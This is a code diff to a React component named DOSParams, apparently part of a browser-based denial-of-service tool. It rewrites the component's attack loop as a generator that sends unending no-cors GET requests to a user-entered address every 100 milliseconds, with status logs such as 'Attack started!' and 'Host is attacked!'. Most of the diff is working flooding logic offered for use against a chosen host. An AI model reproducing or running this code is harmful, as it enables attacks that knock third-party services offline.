@@ -1,7 +1,7 @@
 import { FC, useEffect, useState } from 'react'
 import AttackParamsWrapper from '@/hoc/attack-params-wrapper/AttackParamsWrapper'
 import AttackTrigger from '@/components/ui/triggers/attack-trigger/AttackTrigger'
-import { Icon, Input, Text } from '@chakra-ui/react'
+import { Icon, Input, Text, Alert, AlertIcon, useToast } from '@chakra-ui/react'
 import { BiSolidRightArrow } from 'react-icons/bi'
 import { IoStop } from 'react-icons/io5'
 import IconTooltipBtn from '@/components/ui/buttons/icon-tooltip-btn/IconTooltipBtn'
@@ -11,31 +11,9 @@ import { useSelector } from 'react-redux'
 import { GoPaperclip } from 'react-icons/go'
 import { RootState } from '@/store'
 import { useNavigate } from "react-router-dom";
-import { RunTaskAPI, useTask } from '@tynik/web-workers';
 
 const DOSParams : FC = () => {
-
-    const [infinityGeneratorTask] = useTask(
-        function* (url) {
-            let status = true
-            if(!status) return
-
-            while (1) {
-                fetch(url, {
-                    method: 'GET',
-                    mode: 'no-cors',
-                    credentials: "same-origin"
-                })
-                .catch(err =>{
-                    status = false
-                    throw err
-                })
-
-                if(status) yield
-            }
-        }
-        )
-    
+    const toast = useToast()
     const { updateLogs, setAttackSwitcher } = useActions()
     const { attackSwitcher } = useSelector((state:RootState) => state )
 
@@ -43,11 +21,10 @@ const DOSParams : FC = () => {
     const [ipAddressError, setIPAdressError] = useState(false)
 
     const [doDosAttack, setDoDosAttack] = useState(false)
-    const [attackInst, setAttackInst] = useState<RunTaskAPI<[url: string], any, any> | null>()
+    const [attackInst, setAttackInst] = useState<Generator<undefined, void, unknown> | null>(null)
     const [attackInterval, setAttackInterval] = useState<NodeJS.Timeout>()
-
-    
-    const [reqSwitcher, setReqSwitcher] = useState(true)
+    const [reqOk, setReqOk] = useState(true)
+    const [blockBtn, setBlockBtn] = useState(false)
     
     const navigate = useNavigate();
     const { resetLogs, lastIsLoaded } = useActions()
@@ -57,11 +34,13 @@ const DOSParams : FC = () => {
     // const [reqBodyError, setReqBodyError] = useState(false)
 
     const checkIPAddress = () => {
+        setBlockBtn(true)
         updateLogs({ type: 'info', time: Date.now(), ctx: 'Process initialization. Validation of input data..', isLoaded: true })
 
         if(!ipAddress.length) {
             updateLogs({ type: 'error', time: Date.now(), ctx: 'IP address not specified!', isLoaded: true })
             setIPAdressError(true)
+            setBlockBtn(false)
             return false
         }
 
@@ -84,29 +63,59 @@ const DOSParams : FC = () => {
             updateLogs({ type: 'error', time: Date.now(), ctx: 'Unable to check IP address', isLoaded: true })
             updateLogs({ type: 'error', time: Date.now(), ctx: error!.toString(), isLoaded: true })
             setIPAdressError(true)
+            setBlockBtn(false)
             return false
         }
     }
 
+    // TODO: GENERATOR вместо worker
+
     const checkReqData = () => {
         updateLogs({ type: 'info', time: Date.now(), ctx: 'Attack started!', isLoaded: true })
-        setTimeout(() => startAttack(), 500)
+        setTimeout(() => {
+            startAttack()
+            setBlockBtn(false)
+        }, 500)
     }
 
     const startAttack = () => {
-            setAttackSwitcher()
-            setDoDosAttack(true)
-            const attack = infinityGeneratorTask.run(ipAddress)
-            setIPAdressError(false)
-            setAttackInst(attack)
+        function* attackGenerator(url:string) {
+            if(!reqOk) throw new Error('error')
+
+            while(true) {
+                try {
+                    fetch(url, {
+                        method: 'GET',
+                        mode: 'no-cors',
+                        credentials: "same-origin"
+                    })
+                } catch (error) {
+                    setReqOk(false)
+                    console.log(error)
+                    throw new Error('error')
+                    return
+                }                
+                
+                    if(reqOk) yield
+                    else throw new Error('error')
+            }
+        }
+
+        setAttackSwitcher()
+        setDoDosAttack(true)
+        const attack = attackGenerator(ipAddress)
+        setIPAdressError(false)
+        setAttackInst(attack)
     }
 
     const stopAttack = () => {
-        if(doDosAttack) {
+        console.log('try to stop..');
+        if(doDosAttack || reqOk) {
+            console.log('stop!');
+            
             updateLogs({ type: 'error', time: Date.now(), ctx: 'Attack stopped!', isLoaded: true })
-            setAttackSwitcher()
+            if(attackSwitcher.value) setAttackSwitcher()
             setDoDosAttack(false)
-            infinityGeneratorTask.stop()
             setAttackInst(null)
             clearInterval(attackInterval)
         }
@@ -127,32 +136,28 @@ const DOSParams : FC = () => {
     useEffect(()=>{
         if(doDosAttack){
             const int = setInterval(async ()=>{
-                if(reqSwitcher){
-                    setReqSwitcher(false)
-                    try {
-                        updateLogs({ type: 'info', time: Date.now(), ctx: JSON.stringify(attackInst), isLoaded: true })
-                        
-                        if(attackInst){
-                            try { 
-                                attackInst.next(ipAddress)
-                                .then((res)=>{
-                                    setReqSwitcher(true)
-                                    updateLogs({ type: 'info', time: Date.now(), ctx: JSON.stringify(res), isLoaded: true })
-                                    updateLogs({ type: 'success', time: Date.now(), ctx: 'Host is attacked!', isLoaded: true })
-                                })
-                            } catch {
-                                updateLogs({ type: 'fatal-error', time: Date.now(), ctx: 'Error when call iterator', isLoaded: true })
-                                stopAttack()
-                            }
-                        }   
-                    } catch {
-                        updateLogs({ type: 'fatal-error', time: Date.now(), ctx: 'Server is not responding!', isLoaded: true  })
-                        stopAttack()
-                        setIPAdressError(true)
-                    }
+            try {
+                // updateLogs({ type: 'info', time: Date.now(), ctx: JSON.stringify(attackInst), isLoaded: true })
+                if(reqOk){
+                    if(attackInst){
+                        try {
+                            attackInst.next(ipAddress)
+                            // .then(()=>{
+                                updateLogs({ type: 'success', time: Date.now(), ctx: 'Host is attacked!', isLoaded: true })
+                            // })
+                        } catch {
+                            updateLogs({ type: 'fatal-error', time: Date.now(), ctx: 'Error when call iterator', isLoaded: true })
+                            stopAttack()
+                        }
+                    } 
                 }
-            }, 100)
-            setAttackInterval(int)
+            } catch {
+                updateLogs({ type: 'fatal-error', time: Date.now(), ctx: 'Server is not responding!', isLoaded: true  })
+                stopAttack()
+                setIPAdressError(true)
+            }
+        }, 100)
+        setAttackInterval(int)
         }
     }, [doDosAttack])
     
@@ -182,6 +187,7 @@ const DOSParams : FC = () => {
                             size='xs'
                             iColor='var(--main-color)'
                             clickHandler={() => checkIPAddress()}
+                            isDisabled={blockBtn}
                             />
                         ) || (
                             <IconTooltipBtn
@@ -190,6 +196,7 @@ const DOSParams : FC = () => {
                             size='xs'
                             iColor='var(--red-color)'
                             clickHandler={() => stopAttack()}
+                            isDisabled={blockBtn}
                             />
                             )
                     }
@@ -206,6 +213,18 @@ const DOSParams : FC = () => {
                     type='file'
                     className='file:mt-[50px] hover:cursor-pointer'
                     isDisabled={attackSwitcher.value}
+                    onClick={(event) => {
+                        event.preventDefault()
+                        toast({
+                        position: 'bottom-left',
+                        render: () => (
+                            <Alert status='info' variant='top-accent' height='35px'>
+                                <AlertIcon />
+                                Coming soon! (in v. 1.1)
+                            </Alert>
+                        ),
+                        })
+                    }}
                     />
                 </div>
             </div>
